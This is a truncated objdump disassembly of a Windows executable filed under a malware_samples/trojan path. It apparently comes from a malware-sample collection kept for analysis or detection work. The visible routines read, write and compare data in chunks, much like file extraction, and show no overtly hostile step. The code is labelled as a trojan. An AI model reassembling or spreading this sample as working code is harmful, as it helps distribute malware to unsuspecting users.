
malware_samples/trojan/6d746e7eb648f9a2a84ca12b314468f8b1382c98853f0c85e2b5c5050b7a9732.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	56                   	push   %esi
  401001:	e8 09 bb 00 00       	call   0x40cb0f
  401006:	8b 30                	mov    (%eax),%esi
  401008:	e8 fc ba 00 00       	call   0x40cb09
  40100d:	56                   	push   %esi
  40100e:	ff 30                	push   (%eax)
  401010:	e8 db 53 00 00       	call   0x4063f0
  401015:	83 c4 08             	add    $0x8,%esp
  401018:	5e                   	pop    %esi
  401019:	89 44 24 08          	mov    %eax,0x8(%esp)
  40101d:	e9 ee 14 00 00       	jmp    0x402510
  401022:	cc                   	int3
  401023:	cc                   	int3
  401024:	cc                   	int3
  401025:	cc                   	int3
  401026:	cc                   	int3
  401027:	cc                   	int3
  401028:	cc                   	int3
  401029:	cc                   	int3
  40102a:	cc                   	int3
  40102b:	cc                   	int3
  40102c:	cc                   	int3
  40102d:	cc                   	int3
  40102e:	cc                   	int3
  40102f:	cc                   	int3
  401030:	b8 b8 38 44 00       	mov    $0x4438b8,%eax
  401035:	c3                   	ret
  401036:	cc                   	int3
  401037:	cc                   	int3
  401038:	cc                   	int3
  401039:	cc                   	int3
  40103a:	cc                   	int3
  40103b:	cc                   	int3
  40103c:	cc                   	int3
  40103d:	cc                   	int3
  40103e:	cc                   	int3
  40103f:	cc                   	int3
  401040:	83 ec 48             	sub    $0x48,%esp
  401043:	53                   	push   %ebx
  401044:	56                   	push   %esi
  401045:	33 db                	xor    %ebx,%ebx
  401047:	8d 44 24 18          	lea    0x18(%esp),%eax
  40104b:	6a 38                	push   $0x38
  40104d:	68 54 63 42 00       	push   $0x426354
  401052:	50                   	push   %eax
  401053:	89 5c 24 44          	mov    %ebx,0x44(%esp)
  401057:	89 5c 24 48          	mov    %ebx,0x48(%esp)
  40105b:	89 5c 24 4c          	mov    %ebx,0x4c(%esp)
  40105f:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  401063:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  401067:	e8 94 7f 00 00       	call   0x409000
  40106c:	8b f0                	mov    %eax,%esi
  40106e:	83 c4 0c             	add    $0xc,%esp
  401071:	85 f6                	test   %esi,%esi
  401073:	74 1f                	je     0x401094
  401075:	8b 44 24 58          	mov    0x58(%esp),%eax
  401079:	56                   	push   %esi
  40107a:	83 c0 12             	add    $0x12,%eax
  40107d:	50                   	push   %eax
  40107e:	68 60 63 42 00       	push   $0x426360
  401083:	e8 c8 0a 00 00       	call   0x401b50
  401088:	83 c4 0c             	add    $0xc,%esp
  40108b:	83 c8 ff             	or     $0xffffffff,%eax
  40108e:	5e                   	pop    %esi
  40108f:	5b                   	pop    %ebx
  401090:	83 c4 48             	add    $0x48,%esp
  401093:	c3                   	ret
  401094:	68 00 20 00 00       	push   $0x2000
  401099:	e8 c5 0a 01 00       	call   0x411b63
  40109e:	83 c4 04             	add    $0x4,%esp
  4010a1:	89 44 24 10          	mov    %eax,0x10(%esp)
  4010a5:	85 c0                	test   %eax,%eax
  4010a7:	75 1f                	jne    0x4010c8
  4010a9:	8b 44 24 58          	mov    0x58(%esp),%eax
  4010ad:	83 c0 12             	add    $0x12,%eax
  4010b0:	50                   	push   %eax
  4010b1:	68 a8 63 42 00       	push   $0x4263a8
  4010b6:	68 ec 63 42 00       	push   $0x4263ec
  4010bb:	e8 70 0a 00 00       	call   0x401b30
  4010c0:	83 c4 0c             	add    $0xc,%esp
  4010c3:	e9 28 01 00 00       	jmp    0x4011f0
  4010c8:	68 00 20 00 00       	push   $0x2000
  4010cd:	e8 91 0a 01 00       	call   0x411b63
  4010d2:	8b d8                	mov    %eax,%ebx
  4010d4:	83 c4 04             	add    $0x4,%esp
  4010d7:	85 db                	test   %ebx,%ebx
  4010d9:	75 1f                	jne    0x4010fa
  4010db:	8b 4c 24 58          	mov    0x58(%esp),%ecx
  4010df:	83 c1 12             	add    $0x12,%ecx
  4010e2:	51                   	push   %ecx
  4010e3:	68 f8 63 42 00       	push   $0x4263f8
  4010e8:	68 ec 63 42 00       	push   $0x4263ec
  4010ed:	e8 3e 0a 00 00       	call   0x401b30
  4010f2:	83 c4 0c             	add    $0xc,%esp
  4010f5:	e9 f6 00 00 00       	jmp    0x4011f0
  4010fa:	8b 44 24 58          	mov    0x58(%esp),%eax
  4010fe:	33 c9                	xor    %ecx,%ecx
  401100:	55                   	push   %ebp
  401101:	8b 6c 24 60          	mov    0x60(%esp),%ebp
  401105:	57                   	push   %edi
  401106:	8b 40 08             	mov    0x8(%eax),%eax
  401109:	8b 7c 24 68          	mov    0x68(%esp),%edi
  40110d:	89 44 24 10          	mov    %eax,0x10(%esp)
  401111:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401115:	85 c9                	test   %ecx,%ecx
  401117:	72 10                	jb     0x401129
  401119:	77 07                	ja     0x401122
  40111b:	3d 00 20 00 00       	cmp    $0x2000,%eax
  401120:	76 07                	jbe    0x401129
  401122:	be 00 20 00 00       	mov    $0x2000,%esi
  401127:	eb 02                	jmp    0x40112b
  401129:	8b f0                	mov    %eax,%esi
  40112b:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  40112f:	ff 30                	push   (%eax)
  401131:	56                   	push   %esi
  401132:	6a 01                	push   $0x1
  401134:	ff 74 24 24          	push   0x24(%esp)
  401138:	e8 75 be 00 00       	call   0x40cfb2
  40113d:	83 c4 10             	add    $0x10,%esp
  401140:	3b c6                	cmp    %esi,%eax
  401142:	0f 85 a3 00 00 00    	jne    0x4011eb
  401148:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  40114c:	ff 30                	push   (%eax)
  40114e:	e8 5a bc 00 00       	call   0x40cdad
  401153:	83 c4 04             	add    $0x4,%esp
  401156:	85 c0                	test   %eax,%eax
  401158:	0f 85 8d 00 00 00    	jne    0x4011eb
  40115e:	29 74 24 10          	sub    %esi,0x10(%esp)
  401162:	89 74 24 24          	mov    %esi,0x24(%esp)
  401166:	19 44 24 14          	sbb    %eax,0x14(%esp)
  40116a:	8b 44 24 18          	mov    0x18(%esp),%eax
  40116e:	89 44 24 20          	mov    %eax,0x20(%esp)
  401172:	8d 44 24 20          	lea    0x20(%esp),%eax
  401176:	c7 44 24 30 00 20 00 	movl   $0x2000,0x30(%esp)
  40117d:	00 
  40117e:	6a 00                	push   $0x0
  401180:	50                   	push   %eax
  401181:	89 5c 24 34          	mov    %ebx,0x34(%esp)
  401185:	e8 66 64 00 00       	call   0x4075f0
  40118a:	83 c4 08             	add    $0x8,%esp
  40118d:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401191:	8d 48 04             	lea    0x4(%eax),%ecx
  401194:	83 f9 06             	cmp    $0x6,%ecx
  401197:	77 0e                	ja     0x4011a7
  401199:	0f b6 89 74 12 40 00 	movzbl 0x401274(%ecx),%ecx
  4011a0:	ff 24 8d 68 12 40 00 	jmp    *0x401268(,%ecx,4)
  4011a7:	be 00 20 00 00       	mov    $0x2000,%esi
  4011ac:	2b 74 24 30          	sub    0x30(%esp),%esi
  4011b0:	85 ed                	test   %ebp,%ebp
  4011b2:	74 60                	je     0x401214
  4011b4:	55                   	push   %ebp
  4011b5:	56                   	push   %esi
  4011b6:	6a 01                	push   $0x1
  4011b8:	53                   	push   %ebx
  4011b9:	e8 17 c5 00 00       	call   0x40d6d5
  4011be:	83 c4 10             	add    $0x10,%esp
  4011c1:	3b c6                	cmp    %esi,%eax
  4011c3:	75 0d                	jne    0x4011d2
  4011c5:	55                   	push   %ebp
  4011c6:	e8 e2 bb 00 00       	call   0x40cdad
  4011cb:	83 c4 04             	add    $0x4,%esp
  4011ce:	85 c0                	test   %eax,%eax
  4011d0:	74 53                	je     0x401225
  4011d2:	83 c8 ff             	or     $0xffffffff,%eax
  4011d5:	50                   	push   %eax
  4011d6:	8b 44 24 64          	mov    0x64(%esp),%eax
  4011da:	83 c0 12             	add    $0x12,%eax
  4011dd:	50                   	push   %eax
  4011de:	68 40 64 42 00       	push   $0x426440
  4011e3:	e8 68 09 00 00       	call   0x401b50
  4011e8:	83 c4 0c             	add    $0xc,%esp
  4011eb:	83 ce ff             	or     $0xffffffff,%esi
  4011ee:	5f                   	pop    %edi
  4011ef:	5d                   	pop    %ebp
  4011f0:	8d 44 24 18          	lea    0x18(%esp),%eax
  4011f4:	50                   	push   %eax
  4011f5:	e8 f6 7b 00 00       	call   0x408df0
  4011fa:	ff 74 24 14          	push   0x14(%esp)
  4011fe:	e8 45 09 01 00       	call   0x411b48
  401203:	53                   	push   %ebx
  401204:	e8 3f 09 01 00       	call   0x411b48
  401209:	83 c4 0c             	add    $0xc,%esp
  40120c:	8b c6                	mov    %esi,%eax
  40120e:	5e                   	pop    %esi
  40120f:	5b                   	pop    %ebx
  401210:	83 c4 48             	add    $0x48,%esp
  401213:	c3                   	ret
  401214:	85 ff                	test   %edi,%edi
  401216:	74 11                	je     0x401229
  401218:	56                   	push   %esi
  401219:	53                   	push   %ebx
  40121a:	57                   	push   %edi
  40121b:	e8 60 92 00 00       	call   0x40a480
  401220:	83 c4 0c             	add    $0xc,%esp
  401223:	03 fe                	add    %esi,%edi
  401225:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401229:	83 7c 24 30 00       	cmpl   $0x0,0x30(%esp)
  40122e:	0f 84 3e ff ff ff    	je     0x401172
  401234:	83 f8 01             	cmp    $0x1,%eax
  401237:	74 2a                	je     0x401263
  401239:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40123d:	85 c9                	test   %ecx,%ecx
  40123f:	75 06                	jne    0x401247
  401241:	39 4c 24 10          	cmp    %ecx,0x10(%esp)
  401245:	76 8e                	jbe    0x4011d5
  401247:	8b 44 24 10          	mov    0x10(%esp),%eax
  40124b:	e9 c5 fe ff ff       	jmp    0x401115
  401250:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  401255:	e9 7b ff ff ff       	jmp    0x4011d5
  40125a:	83 f8 01             	cmp    $0x1,%eax
  40125d:	0f 85 72 ff ff ff    	jne    0x4011d5
  401263:	33 f6                	xor    %esi,%esi
  401265:	eb 87                	jmp    0x4011ee
  401267:	90                   	nop
  401268:	5a                   	pop    %edx
  401269:	12 40 00             	adc    0x0(%eax),%al
  40126c:	50                   	push   %eax
  40126d:	12 40 00             	adc    0x0(%eax),%al
  401270:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401271:	11 40 00             	adc    %eax,0x0(%eax)
  401274:	00 00                	add    %al,(%eax)
  401276:	00 02                	add    %al,(%edx)
  401278:	02 02                	add    (%edx),%al
  40127a:	01 cc                	add    %ecx,%esp
  40127c:	cc                   	int3
  40127d:	cc                   	int3
  40127e:	cc                   	int3
  40127f:	cc                   	int3
  401280:	56                   	push   %esi
  401281:	8b 74 24 08          	mov    0x8(%esp),%esi
  401285:	8b 06                	mov    (%esi),%eax
  401287:	85 c0                	test   %eax,%eax
  401289:	74 0f                	je     0x40129a
  40128b:	50                   	push   %eax
  40128c:	e8 c0 ba 00 00       	call   0x40cd51
  401291:	83 c4 04             	add    $0x4,%esp
  401294:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40129a:	5e                   	pop    %esi
  40129b:	c3                   	ret
  40129c:	cc                   	int3
  40129d:	cc                   	int3
  40129e:	cc                   	int3
  40129f:	cc                   	int3
  4012a0:	83 ec 08             	sub    $0x8,%esp
  4012a3:	55                   	push   %ebp
  4012a4:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  4012a8:	8b 55 00             	mov    0x0(%ebp),%edx
  4012ab:	85 d2                	test   %edx,%edx
  4012ad:	75 36                	jne    0x4012e5
  4012af:	8d 45 70             	lea    0x70(%ebp),%eax
  4012b2:	68 50 63 42 00       	push   $0x426350
  4012b7:	50                   	push   %eax
  4012b8:	e8 e3 18 00 00       	call   0x402ba0
  4012bd:	8b d0                	mov    %eax,%edx
  4012bf:	83 c4 08             	add    $0x8,%esp
  4012c2:	89 55 00             	mov    %edx,0x0(%ebp)
  4012c5:	85 d2                	test   %edx,%edx
  4012c7:	75 1c                	jne    0x4012e5
  4012c9:	8b 44 24 14          	mov    0x14(%esp),%eax
  4012cd:	83 c0 12             	add    $0x12,%eax
  4012d0:	50                   	push   %eax
  4012d1:	68 38 65 42 00       	push   $0x426538
  4012d6:	e8 75 08 00 00       	call   0x401b50
  4012db:	83 c4 08             	add    $0x8,%esp
  4012de:	33 c0                	xor    %eax,%eax
  4012e0:	5d                   	pop    %ebp
  4012e1:	83 c4 08             	add    $0x8,%esp
  4012e4:	c3                   	ret
  4012e5:	53                   	push   %ebx
  4012e6:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4012ea:	33 c0                	xor    %eax,%eax
  4012ec:	6a 00                	push   $0x0
  4012ee:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4012f1:	03 4d 08             	add    0x8(%ebp),%ecx
  4012f4:	13 45 0c             	adc    0xc(%ebp),%eax
  4012f7:	50                   	push   %eax
  4012f8:	51                   	push   %ecx
  4012f9:	52                   	push   %edx
  4012fa:	e8 d7 c0 00 00       	call   0x40d3d6
  4012ff:	83 c4 10             	add    $0x10,%esp
  401302:	85 c0                	test   %eax,%eax
  401304:	79 1e                	jns    0x401324
  401306:	8d 43 12             	lea    0x12(%ebx),%eax
  401309:	50                   	push   %eax
  40130a:	68 6c 65 42 00       	push   $0x42656c
  40130f:	68 a8 65 42 00       	push   $0x4265a8
  401314:	e8 17 08 00 00       	call   0x401b30
  401319:	83 c4 0c             	add    $0xc,%esp
  40131c:	33 c0                	xor    %eax,%eax
  40131e:	5b                   	pop    %ebx
  40131f:	5d                   	pop    %ebp
  401320:	83 c4 08             	add    $0x8,%esp
  401323:	c3                   	ret
  401324:	56                   	push   %esi
  401325:	57                   	push   %edi
  401326:	ff 73 0c             	push   0xc(%ebx)
  401329:	e8 35 08 01 00       	call   0x411b63
  40132e:	8b f0                	mov    %eax,%esi
  401330:	83 c4 04             	add    $0x4,%esp
  401333:	89 74 24 10          	mov    %esi,0x10(%esp)
  401337:	85 f6                	test   %esi,%esi
  401339:	75 1e                	jne    0x401359
  40133b:	ff 73 0c             	push   0xc(%ebx)
  40133e:	8d 4b 12             	lea    0x12(%ebx),%ecx
  401341:	51                   	push   %ecx
  401342:	68 b0 65 42 00       	push   $0x4265b0
  401347:	68 ec 63 42 00       	push   $0x4263ec
  40134c:	e8 df 07 00 00       	call   0x401b30
  401351:	83 c4 10             	add    $0x10,%esp
  401354:	e9 7f 00 00 00       	jmp    0x4013d8
  401359:	80 7b 10 01          	cmpb   $0x1,0x10(%ebx)
  40135d:	75 1e                	jne    0x40137d
  40135f:	56                   	push   %esi
  401360:	6a 00                	push   $0x0
  401362:	53                   	push   %ebx
  401363:	55                   	push   %ebp
  401364:	e8 d7 fc ff ff       	call   0x401040
  401369:	83 c4 10             	add    $0x10,%esp
  40136c:	85 c0                	test   %eax,%eax
  40136e:	74 68                	je     0x4013d8
  401370:	56                   	push   %esi
  401371:	e8 d2 07 01 00       	call   0x411b48
  401376:	83 c4 04             	add    $0x4,%esp
  401379:	33 f6                	xor    %esi,%esi
  40137b:	eb 5b                	jmp    0x4013d8
  40137d:	8b c6                	mov    %esi,%eax
  40137f:	8b 73 0c             	mov    0xc(%ebx),%esi
  401382:	33 db                	xor    %ebx,%ebx
  401384:	89 44 24 14          	mov    %eax,0x14(%esp)
  401388:	85 f6                	test   %esi,%esi
  40138a:	74 48                	je     0x4013d4
  40138c:	0f 1f 40 00          	nopl   0x0(%eax)
  401390:	85 db                	test   %ebx,%ebx
  401392:	72 11                	jb     0x4013a5
  401394:	77 08                	ja     0x40139e
  401396:	81 fe 00 20 00 00    	cmp    $0x2000,%esi
  40139c:	76 07                	jbe    0x4013a5
  40139e:	bf 00 20 00 00       	mov    $0x2000,%edi
  4013a3:	eb 02                	jmp    0x4013a7
  4013a5:	8b fe                	mov    %esi,%edi
  4013a7:	ff 75 00             	push   0x0(%ebp)
  4013aa:	6a 01                	push   $0x1
  4013ac:	57                   	push   %edi
  4013ad:	50                   	push   %eax
  4013ae:	e8 ff bb 00 00       	call   0x40cfb2
  4013b3:	83 c4 10             	add    $0x10,%esp
  4013b6:	83 f8 01             	cmp    $0x1,%eax
  4013b9:	72 3e                	jb     0x4013f9
  4013bb:	8b 44 24 14          	mov    0x14(%esp),%eax
  4013bf:	2b f7                	sub    %edi,%esi
  4013c1:	83 db 00             	sbb    $0x0,%ebx
  4013c4:	03 c7                	add    %edi,%eax
  4013c6:	89 44 24 14          	mov    %eax,0x14(%esp)
  4013ca:	85 db                	test   %ebx,%ebx
  4013cc:	77 d0                	ja     0x40139e
  4013ce:	72 04                	jb     0x4013d4
  4013d0:	85 f6                	test   %esi,%esi
  4013d2:	75 bc                	jne    0x401390
  4013d4:	8b 74 24 10          	mov    0x10(%esp),%esi
  4013d8:	8b 45 00             	mov    0x0(%ebp),%eax
  4013db:	85 c0                	test   %eax,%eax
  4013dd:	74 10                	je     0x4013ef
  4013df:	50                   	push   %eax
  4013e0:	e8 6c b9 00 00       	call   0x40cd51
  4013e5:	83 c4 04             	add    $0x4,%esp
  4013e8:	c7 45 00 00 00 00 00 	movl   $0x0,0x0(%ebp)
  4013ef:	5f                   	pop    %edi
  4013f0:	8b c6                	mov    %esi,%eax
  4013f2:	5e                   	pop    %esi
  4013f3:	5b                   	pop    %ebx
  4013f4:	5d                   	pop    %ebp
  4013f5:	83 c4 08             	add    $0x8,%esp
  4013f8:	c3                   	ret
  4013f9:	8b 44 24 20          	mov    0x20(%esp),%eax
  4013fd:	83 c0 12             	add    $0x12,%eax
  401400:	50                   	push   %eax
  401401:	68 c0 64 42 00       	push   $0x4264c0
  401406:	68 f4 64 42 00       	push   $0x4264f4
  40140b:	e8 20 07 00 00       	call   0x401b30
  401410:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401414:	83 c4 0c             	add    $0xc,%esp
  401417:	56                   	push   %esi
  401418:	e8 2b 07 01 00       	call   0x411b48
  40141d:	83 c4 04             	add    $0x4,%esp
  401420:	33 f6                	xor    %esi,%esi
  401422:	eb b4                	jmp    0x4013d8
  401424:	cc                   	int3
  401425:	cc                   	int3
  401426:	cc                   	int3
  401427:	cc                   	int3
  401428:	cc                   	int3
  401429:	cc                   	int3
  40142a:	cc                   	int3
  40142b:	cc                   	int3
  40142c:	cc                   	int3
  40142d:	cc                   	int3
  40142e:	cc                   	int3
  40142f:	cc                   	int3
  401430:	83 ec 0c             	sub    $0xc,%esp
  401433:	55                   	push   %ebp
  401434:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401438:	55                   	push   %ebp
  401439:	e8 72 42 00 00       	call   0x4056b0
  40143e:	83 c4 04             	add    $0x4,%esp
  401441:	83 f8 ff             	cmp    $0xffffffff,%eax
  401444:	75 07                	jne    0x40144d
  401446:	0b c0                	or     %eax,%eax
  401448:	5d                   	pop    %ebp
  401449:	83 c4 0c             	add    $0xc,%esp
  40144c:	c3                   	ret
  40144d:	53                   	push   %ebx
  40144e:	56                   	push   %esi
  40144f:	8b 74 24 20          	mov    0x20(%esp),%esi
  401453:	8d 85 70 30 00 00    	lea    0x3070(%ebp),%eax
  401459:	57                   	push   %edi
  40145a:	8d 5e 12             	lea    0x12(%esi),%ebx
  40145d:	53                   	push   %ebx
  40145e:	50                   	push   %eax
  40145f:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  401463:	e8 18 45 00 00       	call   0x405980
  401468:	8b f8                	mov    %eax,%edi
  40146a:	83 c4 08             	add    $0x8,%esp
  40146d:	89 7c 24 18          	mov    %edi,0x18(%esp)
  401471:	85 ff                	test   %edi,%edi
  401473:	75 1e                	jne    0x401493
  401475:	53                   	push   %ebx
  401476:	68 f4 65 42 00       	push   $0x4265f4
  40147b:	68 28 66 42 00       	push   $0x426628
  401480:	e8 ab 06 00 00       	call   0x401b30
  401485:	83 c4 0c             	add    $0xc,%esp
  401488:	83 c8 ff             	or     $0xffffffff,%eax
  40148b:	5f                   	pop    %edi
  40148c:	5e                   	pop    %esi
  40148d:	5b                   	pop    %ebx
  40148e:	5d                   	pop    %ebp
  40148f:	83 c4 0c             	add    $0xc,%esp
  401492:	c3                   	ret
  401493:	8b 55 00             	mov    0x0(%ebp),%edx
  401496:	85 d2                	test   %edx,%edx
  401498:	75 30                	jne    0x4014ca
  40149a:	8d 45 70             	lea    0x70(%ebp),%eax
  40149d:	68 50 63 42 00       	push   $0x426350
  4014a2:	50                   	push   %eax
  4014a3:	e8 f8 16 00 00       	call   0x402ba0
  4014a8:	8b d0                	mov    %eax,%edx
  4014aa:	83 c4 08             	add    $0x8,%esp
  4014ad:	89 55 00             	mov    %edx,0x0(%ebp)
  4014b0:	85 d2                	test   %edx,%edx
  4014b2:	75 16                	jne    0x4014ca
  4014b4:	53                   	push   %ebx
  4014b5:	68 38 65 42 00       	push   $0x426538
  4014ba:	e8 91 06 00 00       	call   0x401b50
  4014bf:	83 c4 08             	add    $0x8,%esp
  4014c2:	83 cf ff             	or     $0xffffffff,%edi
  4014c5:	e9 26 01 00 00       	jmp    0x4015f0
  4014ca:	8b 4e 04             	mov    0x4(%esi),%ecx
  4014cd:	33 c0                	xor    %eax,%eax
  4014cf:	03 4d 08             	add    0x8(%ebp),%ecx
  4014d2:	6a 00                	push   $0x0
  4014d4:	13 45 0c             	adc    0xc(%ebp),%eax
  4014d7:	50                   	push   %eax
  4014d8:	51                   	push   %ecx
  4014d9:	52                   	push   %edx
  4014da:	e8 f7 be 00 00       	call   0x40d3d6
  4014df:	83 c4 10             	add    $0x10,%esp
  4014e2:	85 c0                	test   %eax,%eax
  4014e4:	79 1b                	jns    0x401501
  4014e6:	53                   	push   %ebx
  4014e7:	68 6c 65 42 00       	push   $0x42656c
  4014ec:	68 a8 65 42 00       	push   $0x4265a8
  4014f1:	e8 3a 06 00 00       	call   0x401b30
  4014f6:	83 c4 0c             	add    $0xc,%esp
  4014f9:	83 cf ff             	or     $0xffffffff,%edi
  4014fc:	e9 ef 00 00 00       	jmp    0x4015f0
  401501:	80 7e 10 01          	cmpb   $0x1,0x10(%esi)
  401505:	75 14                	jne    0x40151b
  401507:	6a 00                	push   $0x0
  401509:	57                   	push   %edi
  40150a:	56                   	push   %esi
  40150b:	55                   	push   %ebp
  40150c:	e8 2f fb ff ff       	call   0x401040
  401511:	83 c4 10             	add    $0x10,%esp
  401514:	8b f8                	mov    %eax,%edi
  401516:	e9 d5 00 00 00       	jmp    0x4015f0
  40151b:	68 00 20 00 00       	push   $0x2000
  401520:	33 ff                	xor    %edi,%edi
  401522:	e8 3c 06 01 00       	call   0x411b63
  401527:	83 c4 04             	add    $0x4,%esp
  40152a:	89 44 24 10          	mov    %eax,0x10(%esp)
  40152e:	85 c0                	test   %eax,%eax
  401530:	75 1b                	jne    0x40154d
  401532:	53                   	push   %ebx
  401533:	68 84 64 42 00       	push   $0x426484
  401538:	68 ec 63 42 00       	push   $0x4263ec
  40153d:	e8 ee 05 00 00       	call   0x401b30
  401542:	83 c4 0c             	add    $0xc,%esp
  401545:	83 cf ff             	or     $0xffffffff,%edi
  401548:	e9 a3 00 00 00       	jmp    0x4015f0
  40154d:	8b 76 0c             	mov    0xc(%esi),%esi
  401550:	33 db                	xor    %ebx,%ebx
  401552:	85 f6                	test   %esi,%esi
  401554:	0f 84 8d 00 00 00    	je     0x4015e7
  40155a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  401560:	85 db                	test   %ebx,%ebx
  401562:	72 11                	jb     0x401575
  401564:	77 08                	ja     0x40156e
  401566:	81 fe 00 20 00 00    	cmp    $0x2000,%esi
  40156c:	76 07                	jbe    0x401575
  40156e:	bf 00 20 00 00       	mov    $0x2000,%edi
  401573:	eb 02                	jmp    0x401577
  401575:	8b fe                	mov    %esi,%edi
  401577:	ff 75 00             	push   0x0(%ebp)
  40157a:	6a 01                	push   $0x1
  40157c:	57                   	push   %edi
  40157d:	50                   	push   %eax
  40157e:	e8 2f ba 00 00       	call   0x40cfb2
  401583:	83 c4 10             	add    $0x10,%esp
  401586:	83 f8 01             	cmp    $0x1,%eax
  401589:	72 3f                	jb     0x4015ca
  40158b:	ff 74 24 18          	push   0x18(%esp)
  40158f:	6a 01                	push   $0x1
  401591:	57                   	push   %edi
  401592:	ff 74 24 1c          	push   0x1c(%esp)
  401596:	e8 3a c1 00 00       	call   0x40d6d5
  40159b:	83 c4 10             	add    $0x10,%esp
  40159e:	83 f8 01             	cmp    $0x1,%eax
  4015a1:	72 17                	jb     0x4015ba
  4015a3:	8b 44 24 10          	mov    0x10(%esp),%eax
  4015a7:	2b f7                	sub    %edi,%esi
  4015a9:	83 db 00             	sbb    $0x0,%ebx
  4015ac:	85 db                	test   %ebx,%ebx
  4015ae:	77 be                	ja     0x40156e
  4015b0:	72 04                	jb     0x4015b6
  4015b2:	85 f6                	test   %esi,%esi
  4015b4:	75 aa                	jne    0x401560
  4015b6:	33 ff                	xor    %edi,%edi
  4015b8:	eb 29                	jmp    0x4015e3
  4015ba:	ff 74 24 14          	push   0x14(%esp)
  4015be:	68 fc 64 42 00       	push   $0x4264fc
  4015c3:	68 30 65 42 00       	push   $0x426530
  4015c8:	eb 0e                	jmp    0x4015d8
  4015ca:	ff 74 24 14          	push   0x14(%esp)
  4015ce:	68 c0 64 42 00       	push   $0x4264c0
  4015d3:	68 f4 64 42 00       	push   $0x4264f4
  4015d8:	e8 53 05 00 00       	call   0x401b30
  4015dd:	83 c4 0c             	add    $0xc,%esp
  4015e0:	83 cf ff             	or     $0xffffffff,%edi
  4015e3:	8b 44 24 10          	mov    0x10(%esp),%eax
  4015e7:	50                   	push   %eax
  4015e8:	e8 5b 05 01 00       	call   0x411b48
  4015ed:	83 c4 04             	add    $0x4,%esp
  4015f0:	8b 45 00             	mov    0x0(%ebp),%eax
  4015f3:	85 c0                	test   %eax,%eax
  4015f5:	74 10                	je     0x401607
  4015f7:	50                   	push   %eax
  4015f8:	e8 54 b7 00 00       	call   0x40cd51
  4015fd:	83 c4 04             	add    $0x4,%esp
  401600:	c7 45 00 00 00 00 00 	movl   $0x0,0x0(%ebp)
  401607:	ff 74 24 18          	push   0x18(%esp)
  40160b:	e8 41 b7 00 00       	call   0x40cd51
  401610:	83 c4 04             	add    $0x4,%esp
  401613:	8b c7                	mov    %edi,%eax
  401615:	5f                   	pop    %edi
  401616:	5e                   	pop    %esi
  401617:	5b                   	pop    %ebx
  401618:	5d                   	pop    %ebp
  401619:	83 c4 0c             	add    $0xc,%esp
  40161c:	c3                   	ret
  40161d:	cc                   	int3
  40161e:	cc                   	int3
  40161f:	cc                   	int3
  401620:	53                   	push   %ebx
  401621:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401625:	55                   	push   %ebp
  401626:	56                   	push   %esi
  401627:	57                   	push   %edi
  401628:	8b 73 10             	mov    0x10(%ebx),%esi
  40162b:	8b 7b 14             	mov    0x14(%ebx),%edi
  40162e:	3b f7                	cmp    %edi,%esi
  401630:	73 42                	jae    0x401674
  401632:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  401636:	8b c5                	mov    %ebp,%eax
  401638:	8d 4e 12             	lea    0x12(%esi),%ecx
  40163b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  401640:	8a 11                	mov    (%ecx),%dl
  401642:	3a 10                	cmp    (%eax),%dl
  401644:	75 1a                	jne    0x401660
  401646:	84 d2                	test   %dl,%dl
  401648:	74 12                	je     0x40165c
  40164a:	8a 51 01             	mov    0x1(%ecx),%dl
  40164d:	3a 50 01             	cmp    0x1(%eax),%dl
  401650:	75 0e                	jne    0x401660
  401652:	83 c1 02             	add    $0x2,%ecx
  401655:	83 c0 02             	add    $0x2,%eax
  401658:	84 d2                	test   %dl,%dl
  40165a:	75 e4                	jne    0x401640
  40165c:	33 c0                	xor    %eax,%eax
  40165e:	eb 05                	jmp    0x401665
  401660:	1b c0                	sbb    %eax,%eax
  401662:	83 c8 01             	or     $0x1,%eax
  401665:	85 c0                	test   %eax,%eax
  401667:	74 26                	je     0x40168f
  401669:	03 36                	add    (%esi),%esi
  40166b:	3b 73 10             	cmp    0x10(%ebx),%esi
  40166e:	72 0b                	jb     0x40167b
  401670:	3b f7                	cmp    %edi,%esi
  401672:	72 c2                	jb     0x401636
  401674:	5f                   	pop    %edi
  401675:	5e                   	pop    %esi
  401676:	5d                   	pop    %ebp
  401677:	33 c0                	xor    %eax,%eax
  401679:	5b                   	pop    %ebx
  40167a:	c3                   	ret
  40167b:	68 30 63 42 00       	push   $0x426330
  401680:	e8 cb 04 00 00       	call   0x401b50
  401685:	83 c4 04             	add    $0x4,%esp
  401688:	33 c0                	xor    %eax,%eax
  40168a:	5f                   	pop    %edi
  40168b:	5e                   	pop    %esi
  40168c:	5d                   	pop    %ebp
  40168d:	5b                   	pop    %ebx
  40168e:	c3                   	ret
  40168f:	5f                   	pop    %edi
  401690:	8b c6                	mov    %esi,%eax
  401692:	5e                   	pop    %esi
  401693:	5d                   	pop    %ebp
  401694:	5b                   	pop    %ebx
  401695:	c3                   	ret
  401696:	cc                   	int3
  401697:	cc                   	int3
  401698:	cc                   	int3
  401699:	cc                   	int3
  40169a:	cc                   	int3
  40169b:	cc                   	int3
  40169c:	cc                   	int3
  40169d:	cc                   	int3
  40169e:	cc                   	int3
  40169f:	cc                   	int3
  4016a0:	53                   	push   %ebx
  4016a1:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4016a5:	55                   	push   %ebp
  4016a6:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  4016aa:	56                   	push   %esi
  4016ab:	8b 73 10             	mov    0x10(%ebx),%esi
  4016ae:	57                   	push   %edi
